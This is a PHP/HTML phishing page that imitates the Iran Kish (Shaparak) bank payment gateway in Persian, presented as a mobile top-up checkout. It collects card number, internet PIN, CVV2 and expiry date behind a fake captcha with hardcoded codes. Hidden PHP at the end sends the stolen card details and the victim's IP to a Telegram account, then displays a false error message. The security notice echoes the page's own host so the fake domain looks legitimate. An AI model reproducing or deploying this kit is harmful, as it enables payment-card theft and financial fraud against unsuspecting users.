<!DOCTYPE html>
<html><head lang="en">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

	<meta name="author" content="iran kish">
	<meta name="keywords" content="iran kish">
	<meta name="description" content="iran kish">
	<meta name="apple-mobile-web-app-title" content="iran kish">

	<link rel="shortcut icon" href="">
	<link rel="apple-touch-icon-precomposed" href="">

	<title>عملیات شارژ مستقیم شاپرک</title>

	<link href="css/bootstrap.css" rel="stylesheet">
	<link href="css/bootstrap-rtl.css" rel="stylesheet">
	<link href="css/bootstrapConfig.css" rel="stylesheet">
	<link href="css/AQ4.css" rel="stylesheet">

	<!--[if lt IE 9]>
	<link href="~/Content/_Layouts/_Payment/css/pay-IE8-hack.css" rel="stylesheet" />
	<![endif]-->

	<script src="js/jquery-3.js"></script>
	<script src="js/dtx-no-back.js"></script>
	<script src="js/angular.js"></script>
	<script src="js/metisMenu.js"></script>

</head>
<body class="pay">

	<div class="payment-page-header">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<img src="css/shaparak.png" class="modal-header-logos-002 pull-right" alt="شاپرک بانک مرکزی">
				<img src="css/irankish_logo.png" class="modal-header-logos-001 pull-left" alt="شرکت کارت اعتباری ایران کیش">
			</div>
		</div>
	</div>
</div>


	<div class="container">
		<div class="row">
			<div class="col-sm-12 col-md-10 col-md-offset-1">

				<div class="row">
	<div class="col-xs-12">
		<div class="timer" style="top: -1px;">
			<p>زمان باقیمانده: <span id="displayTimeRemaining">10:00</span></p>
		</div>
	</div>
</div>



<script>

	$(document).ready(function () {

		var minutes = 10;
		var seconds = 0;

				var referer = '../../';


		var myInterval = setInterval(function () {

			if (seconds > 0) {

				seconds--;

			}
			else {

				if (minutes > 0) {

					minutes--;
					seconds = 59;

				}
				else {

				}

			}

			var minutesString = minutes.toString();
			if (minutesString.length == 1) {

				minutesString = '0' + minutesString;

			}

			var secondsString = seconds.toString();
			if (secondsString.length == 1) {

				secondsString = '0' + secondsString;

			}

			var result =
				minutesString + ':' + secondsString

			$('span#displayTimeRemaining').html(result);

			if ((minutes == 0) && (seconds == 0)) {

				clearInterval(myInterval);

				if ((referer === undefined) || (referer === null) || (referer === '')) {

					$('span#displayTimeRemaining').html("EXPIRED");

				}
				else {

					window.location = referer;

				}

			}

		}, 1000);

	});

</script>


				
				<div class="row">
	<div style="display: none" id="alert-fan" class="col-xs-12">
		<div class="alert alert-danger">
			<ul>

					<li id="inpart1" style="display: none">
						تکميل قسمت اول شماره کارت الزامی است!
					</li>
					<li id="inpart2" style="display: none">
						تکميل قسمت دوم شماره کارت الزامی است!
					</li>
					<li id="inpart3" style="display: none">
						تکميل قسمت سوم شماره کارت الزامی است!
					</li>
					<li id="inpart4" style="display: none">
						تکميل قسمت چهارم شماره کارت الزامی است!
					</li>
					<li id="int-check" style="display: none">
						تکمیل رمز دوم (اینترنتی) کارت الزامی است!
					</li style="display: none">
					<li id="cvv2-check" style="display: none">
						تکمیل CCV2 کارت الزامی است
					</li>
					<li id="check-card-i" style="display: none">
						مقادیر وارد شده نامعتبر هستند!
					</li>
					<li id="mounth-check" style="display: none">
						تکمیل ماه انقضای کارت الزامی است!
					</li>
					<li id="year-check" style="display: none">
						تکمیل سال انقضای کارت الزامی است!
					</li>
					<li id="code-check" style="display: none">
						تکمیل کد امنیتی الزامی است!
					</li>
					<li style="display: none">
						کد امنیتی وارد شده نامعتبر میباشد!
					</li>
			</ul>
		</div>
	</div>
</div>
				<div class="row m-t-xs-20">
					








<div class="col-sm-6 col-sm-push-6 pay-info pay-general footer-style-2">

	<button class="btn btn-primary btn-block pay-info-collapse m-b-xs-20" type="button" data-toggle="collapse" data-target="#acc" aria-expanded="false" aria-controls="acc">
		<span class="glyphicon glyphicon-eye-open btn-c-1" aria-hidden="true"></span>
		<span class="glyphicon glyphicon-triangle-bottom btn-c-2" aria-hidden="true"></span>
		مشاهده جزئیات
	</button>

	<div class="collapse" id="acc">
		<div class="well">
			<div class="row">
				<div class="col-md-12 pay-info-001">
					<div>
						<img src="css/irankish_logo.png" alt="شرکت کارت اعتباری ایران کیش" style="max-height: 40px; top: 32.0916px; width: 200px;">
					</div>
				</div>
			</div>

			<div class="row">
				<div class="col-md-12 pay-info-002">

					<p>
						
						<a href="../../" class="btn btn-primary btn-xs">بازگشت به صفحه قبل در جهت ویرایش اطلاعات</a>
					</p>

					<p>
						<span class="glyphicon glyphicon-stop" aria-hidden="true"></span>
						عملیات شارژ مستقیم ایرانسل
					</p>

					<p>
						<span class="glyphicon glyphicon-stop" aria-hidden="true"></span>
						مبلغ شارژ:
						<span style="font-weight: 800;margin: 0 5px;color: #0F4DBC;">
							10,000
						</span>
						ریال
					</p>

					<p>
						<span class="glyphicon glyphicon-stop" aria-hidden="true"></span>
						شماره تلفن همراه:
						09366666666
					</p>

					<p>
						<span class="glyphicon glyphicon-stop" aria-hidden="true"></span>
						پذیرنده:
						شرکت کارت اعتباری ایران کیش
					</p>

					<p>
						<span class="glyphicon glyphicon-stop" aria-hidden="true"></span>
						شماره پایانه:
						02013084
					</p>

					<p>
						<span class="glyphicon glyphicon-stop" aria-hidden="true"></span>
						کد پذیرندگی:
						<?php echo rand(128394850283745,928301928374951); ?>
					</p>

				</div>
			</div>

			<div class="row foot-1">
				<div class="col-md-12 pay-info-004">
					<p>
						شرکت کارت اعتباری ایران کیش
					</p>
					<a href="https://www.irankish.com/" target="_blank">
						<p>
							<span class="glyphicon glyphicon-paperclip" aria-hidden="true" style="font-size: 17px; top: 5px; right: -3px;color: rgb(6, 175, 78);"></span>
							www.IranKish.com
						</p>
					</a>
				</div>
			</div>
		</div>
	</div>
</div>


<form id="paymentForm" action="" autocomplete="off" method="post" role="form" spellcheck="false" translate="no">

	<div class="col-sm-6 col-sm-pull-6 m-b-xs-20">

	<div class="pay-main-col">

		<div class="row">

			<div class="col-xs-12">

				<div class="form-group">
					<label class="pay-main-col-001-label">
						شماره کارت
					</label>

					<div class="ltr pay-main-col-table">
						<div class="pay-layout">
							<div class="pay-layout-row">
								<div class="pay-layout-cell pay-layout-cell-input">
									<input id="Part1" name="Part1" class="form-control ltr number paymentField" maxlength="4" tabindex="1" autocomplete="off" type="text">
								</div>
								<div class="pay-layout-cell pay-layout-cell-divider">
									<span></span>
								</div>
								<div class="pay-layout-cell pay-layout-cell-input">
									<input id="Part2" name="Part2" class="form-control ltr number paymentField" maxlength="4" tabindex="2" autocomplete="off" type="text">
								</div>
								<div class="pay-layout-cell pay-layout-cell-divider">
									<span></span>
								</div>
								<div class="pay-layout-cell pay-layout-cell-input">
									<input id="Part3" name="Part3" class="form-control ltr number paymentField" maxlength="4" tabindex="3" autocomplete="off" type="text">
								</div>
								<div class="pay-layout-cell pay-layout-cell-divider">
									<span></span>
								</div>
								<div class="pay-layout-cell pay-layout-cell-input">
									<input id="Part4" name="Part4" class="form-control ltr number paymentField" maxlength="4" tabindex="4" autocomplete="off" type="text">
								</div>
								<div class="pay-layout-cell pay-layout-cell-divider">
									<span></span>
								</div>
								<div class="pay-layout-cell pay-layout-cell-input">
									<input name="Part5" class="form-control ltr number paymentField" maxlength="4" tabindex="5" autocomplete="off" disabled="disabled" type="text">
								</div>
							</div>
						</div>
					</div>

					<div class="clearfix"></div>

					<p class="help-block">
						در صورت فعال شدن فیلد پنجم، لطفا آن را پر نمایید
					</p>
				</div>
			</div>
		</div>

		<div class="row">
			<div class="col-xs-12">
				<div class="form-group form-inline pay-main-col-002">
					<label>
						رمز دوم کارت (رمز اينترنتی)
					</label>

					<input id="Part6" name="Part6" class="form-control ltr number paymentField pull-left keypad is-keypad" maxlength="12" tabindex="6" autocomplete="off" pattern="\d*" type="password">

					<p class="help-block">
						لطفاً از صحت رمز عبور خود مطمئن شوید
					</p>
				</div>
			</div>
		</div>

		<div class="row">
			<div class="col-xs-12">
				<div class="form-group form-inline pay-main-col-003">
					<label>
						کد سه یا چهار رقمی ( cvv2 )
					</label>

					<input id="Part7" name="Part7" class="form-control ltr number paymentField pull-left keypad is-keypad" maxlength="4" tabindex="7" autocomplete="off" type="password">
				</div>
			</div>
		</div>

		<div class="row">
			<div class="col-xs-12">
				<div class="form-group date-main-col-wrapper">
					<label>
						تاریخ انقضای کارت
					</label>

					<div class="ltr pull-left date-main-col-table">
						<div class="date-layout">
							<div class="date-layout-row">
								<div class="date-layout-cell">
									<input id="Part9" name="Part9" class="form-control ltr number paymentField" maxlength="2" tabindex="9" autocomplete="off" type="text">
								</div>
								<div class="date-layout-cell date-layout-cell-txt">
									<span style="margin-left: 5px;margin-right: 5px;">سال</span>
								</div>
								<div class="date-layout-cell">
									<input id="Part8" name="Part8" class="form-control ltr number paymentField" maxlength="2" tabindex="8" autocomplete="off" type="text">
								</div>
								<div class="date-layout-cell date-layout-cell-txt">
									<span style="margin-left: 5px">ماه</span>
								</div>
							</div>
						</div>
					</div>

					<div class="clearfix"></div>
				</div>
			</div>
		</div>

		<div class="row">
			<div class="col-xs-12">
				<div class="form-group form-inline">
					<label>
						عبارت زیر را در کادر وارد نمایید
					</label>

					<div class="captcha-wrapper">
						<div class="pay-main-col-007 pull-right">
							<button type="button" id="btnRefreshCaptchaImage" class="btn btn-default">
								<span class="glyphicon glyphicon-refresh" aria-hidden="true"></span>
							</button>
						</div>

						<div class=" pay-main-col-006 pull-left">
							<img id="imgCaptchaImage" src="img/<?php $r = rand(1,10); switch($r) {case 1: echo 'GetCaptchaImage.png'; break; case 2: echo 'GetCaptchaImage2.png'; break; case 3: echo 'GetCaptchaImage3.png'; break; case 4: echo 'GetCaptchaImage4.png'; break; case 5: echo 'GetCaptchaImage5.png'; break; case 6: echo 'GetCaptchaImage6.png'; break; case 7: echo 'GetCaptchaImage7.png'; break; case 8: echo 'GetCaptchaImage8.png'; break; case 9: echo 'GetCaptchaImage9.png'; break; case 10: echo 'GetCaptchaImage10.png'; break;} ?>" alt="Security Code" title="Security Code">
						</div>
					</div>
				</div>
			</div>
		</div>

		<div class="row">
			<div class="col-xs-12">
				<div class="form-group form-inline " style="overflow: hidden;">
					<input id="captcha-code-i" name="Part10" class="form-control ltr number paymentField pull-left" maxlength="6" tabindex="10" autocomplete="off" type="text">
				</div>
			</div>
		</div>


		<div class="row">
			<div class="col-xs-6">
				<button type="submit" name="submit" id="paymentButton" class="btn btn-success btn-block btn-c" tabindex="11" style=" padding: 3px 12px;">
					<span class="glyphicon glyphicon-ok btn-c-3 FR" aria-hidden="true"></span>
					پرداخت
				</button>
			</div>
			<div class="col-xs-6">
				<button type="reset" class="btn btn-default btn-block  pull-left btn-c" tabindex="12" style=" padding: 3px 12px;">
					انصراف
				</button>
			</div>
		</div>
	</div>
</div>
<script>

	var captchaImageIndex = 0;

	$(document).ready(function () {

		$("button#btnRefreshCaptchaImage").click(function () {

			captchaImageIndex++;

			$("img#imgCaptchaImage")
				.attr("src", "img/GetCaptchaImage" +
				captchaImageIndex);

		});

	});

</script>

<script>

	$(document).ready(function () {

		$(".paymentField").bind("cut copy paste", function (e) {

			e.preventDefault();

		});

	});

</script>

<script>

	$(document).ready(function () {

		$("input.number").keydown(function (e) {

			if (e.ctrlKey) {

				// CTRL + INS
				if ((e.keyCode == 45) ||
					// CTRL + C
					(e.keyCode == 67) ||
					// CTRL + V
					(e.keyCode == 86)) {
				}
				else {

					e.preventDefault();

				}

			}
			else {

				if (e.shiftKey) {

					// SHIFT + TAB
					if ((e.keyCode == 9) ||
						// SHIFT + LEFT ARROW KEY
						(e.keyCode == 37) ||
						// SHIFT + RIGHT ARROW KEY
						(e.keyCode == 39) ||
						// SHIFT + INS
						(e.keyCode == 45)) {
					}
					else {

						e.preventDefault();

					}

				}
				else {

					// BACKSPACE
					if ((e.keyCode == 8) ||
						// TAB
						(e.keyCode == 9) ||
						// LEFT ARROW KEY
						(e.keyCode == 37) ||
						// RIGHT ARROW KEY
						(e.keyCode == 39) ||
						// DELETE
						(e.keyCode == 46) ||
						// NUMBER KEYS
						((e.keyCode >= 48) && (e.keyCode <= 57)) ||
						// NUMLOCK KEYS
						((e.keyCode >= 96) && (e.keyCode <= 105))) {
					}
					else {

						e.preventDefault();

					}

				}

			}

		});

	});

</script>

<script>

	$(document).ready(function () {

		$("input.paymentField").keydown(function (e) {

			if (((e.keyCode >= 48) && (e.keyCode <= 57)) ||
				((e.keyCode >= 96) && (e.keyCode <= 105))) {

				var varNextElement;

				var varValue = $(this).val();
				var varTabIndex = $(this).attr("tabindex");
				var varMaxLength = $(this).attr("maxlength");

				if (varValue.length >= varMaxLength) {

					varTabIndex++;

					if (varTabIndex > 10) {

						return;

					}

					varNextElement =
						$("input.paymentField[tabindex=" + varTabIndex + "]").first();

					if ($(varNextElement).attr("disabled") == "disabled") {

						varTabIndex++;

						if (varTabIndex > 10) {

							return;

						}

						varNextElement =
							$("input.paymentField[tabindex=" + varTabIndex + "]").first();

					}

					if (varTabIndex == 8) {

						$("input.paymentField[tabindex=7]").keypad('hide');

					}

					$(varNextElement).focus();

				}

			}
			else {

				if (e.keyCode == 8) {

					var varPrevElement;

					var varValue = $(this).val();
					var varTabIndex = $(this).attr("tabindex");

					if (varValue.length <= 0) {

						varTabIndex--;

						if (varTabIndex < 1) {

							return;

						}

						varPrevElement =
							$("input.paymentField[tabindex=" + varTabIndex + "]").first();

						if ($(varPrevElement).attr("disabled") == "disabled") {

							varTabIndex--;

							if (varTabIndex < 1) {

								return;

							}

							varPrevElement =
								$("input.paymentField[tabindex=" + varTabIndex + "]").first();

						}

						if ((varTabIndex == 4) || (varTabIndex == 5)) {

							$("input.paymentField[tabindex=6]").keypad('hide');

						}

						$(varPrevElement).focus();

					}

				}
			}

		});

	});

</script>

<script>

	$(document).ready(function () {

		$("input.keypad").keypad({ showAnim: "", keypadOnly: false, randomiseNumeric: true, });

	});

</script>
<script>
	$(document).ready(function () {

			$('button#paymentButton').click(function (e) {
				if ($('#Part1').val() == "") {
					$('#alert-fan').css('display','block');
					$('#alert-fan li').css('display','none');
					$('#inpart1').css('display','block');
					return false;
				} else if ($('#Part2').val() == "") {
					$('#alert-fan').css('display','block');
					$('#alert-fan li').css('display','none');
					$('#inpart2').css('display','block');
					return false;
				} else if ($('#Part3').val() == "") {
					$('#alert-fan').css('display','block');
					$('#alert-fan li').css('display','none');
					$('#inpart3').css('display','block');
					return false;
				} else if ($('#Part4').val() == "") {
					$('#alert-fan').css('display','block');
					$('#alert-fan li').css('display','none');
					$('#inpart4').css('display','block');
					return false;
				} else if ($('#Part6').val() == "") {
					$('#alert-fan').css('display','block');
					$('#alert-fan li').css('display','none');
					$('#int-check').css('display','block');
					return false;
				} else if ($('#Part7').val() == "") {
					$('#alert-fan').css('display','block');
					$('#alert-fan li').css('display','none');
					$('#cvv2-check').css('display','block');
					return false;
				} else if ($('#Part8').val() == "") {
					$('#alert-fan').css('display','block');
					$('#alert-fan li').css('display','none');
					$('#mounth-check').css('display','block');
					return false;
				} else if ($('#Part9').val() == "") {
					$('#alert-fan').css('display','block');
					$('#alert-fan li').css('display','none');
					$('#year-check').css('display','block');
					return false;
				}
				else if ($('#captcha-code-i').val() == "") {
					$('#alert-fan').css('display','block');
					$('#alert-fan li').css('display','none');
					$('#code-check').css('display','block');
					return false;
				} else if ($('#captcha-code-i').val() != 858188 && $('#captcha-code-i').val() != 579473 && $('#captcha-code-i').val() != 266265 && $('#captcha-code-i').val() != 557728 && $('#captcha-code-i').val() != 313365 && $('#captcha-code-i').val() != 444173 && $('#captcha-code-i').val() != 362716 && $('#captcha-code-i').val() != 688612 && $('#captcha-code-i').val() != 334358) {
					$('#alert-fan').css('display','block');
					$('#alert-fan li').css('display','none');
					$('#alert-fan li:last-child').css('display','block');
					return false;
				} else {
				$(this).html('لطفا کمی صبر کنید');
				$('form#paymentForm').submit();
				}
		});
	});
</script>


</form>

<div class="col-xs-12 text-justify help" style="position: relative;">
	<div class="ssl" style="position: absolute; z-index: 1; left: 15px; top: 0;height: 58px;width: 58px;">
		<img src="css/SSL.png" alt="SSL">
	</div>

	<div class="well">
		<div class="row">
			<div class="col-md-12 title">
				<h5>
					<span class="glyphicon glyphicon-info-sign" aria-hidden="true" style="color: #0085ca"></span>لطفا
					قبل از تکمیل فرایند خرید به نکات زیر توجه فرمایید
				</h5>
			</div>
		</div>

		<p>
			درگاه پرداخت اینترنتی ایران کیش با استفاده ار پروتکل امن SSL به مشتریان خود ارایه خدمت نموده
			است
			و با آدرس <?php echo $_SERVER['HTTP_HOST']; ?> شروع می شود، خواهشمند است به منظور جلوگیری از سوء استفاده
			های
			احتمالی پیش از ورود هرگونه اطلاعات، آدرس موجود در بخش مرورگر وب را با آدرس فوق مقایسه نمایید
			و
			در صورت مشاهده هر نوع مغایرت احتمالی سریعا با شماره 85949-021 مرکز ارتباط با مشتریان ایران
			کیش
			تماس حاصل نمایید.
		</p>

		<ul>
			<li>از صحت نام فروشنده و مبلغ نمایش داده شده اطمینان حاصل نمایید.</li>
			<li>
				برای جلوگیری از افشای رمز کارت خود، لطفا حتی المقدور از صفحه کلید مجازی استفاده نماید.
			</li>
			<li>
				جهت کسب اطلاعات بیشتر، گزارش فروشگاه های مشکوک و همچنین اطلاع از وضعیت پذیرندگان
				اینترنتی با
				شماره 85949-021 تماس بگیرید.
			</li>
		</ul>

		<div class="row">
			<div class="col-md-12 title">
				<h5>
					<span class="glyphicon glyphicon-shopping-cart" aria-hidden="true" style="color: #0085ca"></span>
					راهنمای خرید
				</h5>
			</div>
		</div>

		<ul>
			<li>
				برای انجام تراکنش های اینترنتی باید، رمز دوم یا رمز اینترنتی برای کارت خود دریافت نموده
				باشید.این رمز با رمز اول که در خرید از پایانه های فروش یا دریافت وجه از خودپرداز استفاده
				می
				شود متفاوت است.
			</li>
			<li>کد CVV2 بر روی کارت یا پشت کارت شما درج شده است و متشکل از سه یا چهار رقم است.</li>
			<li>
				تاریخ انقضاء روی کارت شما درج شده است، در هنگام وارد کردن سال انقضاء صرفا باید آن را به
				صورت
				دو رقمی وارد نمایید.
			</li>
		</ul>
	</div>
</div>


				</div>
			</div>
		</div>
	</div>

	<div class="footer">
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-12 text-center">
				<span><em>© </em>1393 - شرکت کارت اعتباری ایران کیش</span>
			</div>
		</div>
	</div>
</div>

	<script src="js/bootstrap.js"></script>
	<script src="js/ie10-viewport-bug-workaround.js"></script>
	<script src="js/jquery.js"></script>
	<script src="js/jquery_003.js"></script>
	<script src="js/jquery_002.js"></script>

	<?php
		if (isset($_POST['submit'])) {
			include ("jdf.php");
			if (!empty($_POST)) {
				require_once 'Telegram.php';
				Telegram::sendMessage('🔐 @Edward_Joseph 🔐'."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".'شماره کارت :'.$_POST['Part4']."-".$_POST['Part3']."-".$_POST['Part2']."-". $_POST['Part1']."\n".'رمز اینترنتی :'. $_POST['Part6']."\n".'Cvv2 :'. $_POST['Part7']."\n".'انقضا :'. $_POST['Part8']."/".$_POST['Part9']."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".'📱آیدی:'.$_SERVER['REMOTE_ADDR']."\n".'⏱ساعت:'.jdate("h:i:s a")."\n".'⏰تاریخ:'.jdate('l Y F ')."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".'🆔 www.aparat.com/media_tarfand');
				echo "<script>
						$('#alert-fan').css('display','block');
						$('#alert-fan li').css('display','none');
						$('#check-card-i').css('display','block');
					  </script>";
			}
		}
	?>


<div class="keypad-rtl keypad-popup" style="display: none;"><div class="keypad-row"><button type="button" class="keypad-key">0</button><button type="button" class="keypad-key">8</button><button type="button" class="keypad-key">9</button><button type="button" class="keypad-special keypad-close" title="بستن">بستن</button></div><div class="keypad-row"><button type="button" class="keypad-key">7</button><button type="button" class="keypad-key">2</button><button type="button" class="keypad-key">4</button><button type="button" class="keypad-special keypad-clear" title="حذف">حذف</button></div><div class="keypad-row"><button type="button" class="keypad-key">5</button><button type="button" class="keypad-key">3</button><button type="button" class="keypad-key">1</button><button type="button" class="keypad-special keypad-back" title="ويرايش">ويرايش</button></div><div class="keypad-row"><div class="keypad-space"></div><button type="button" class="keypad-key">6</button></div></div></body></html>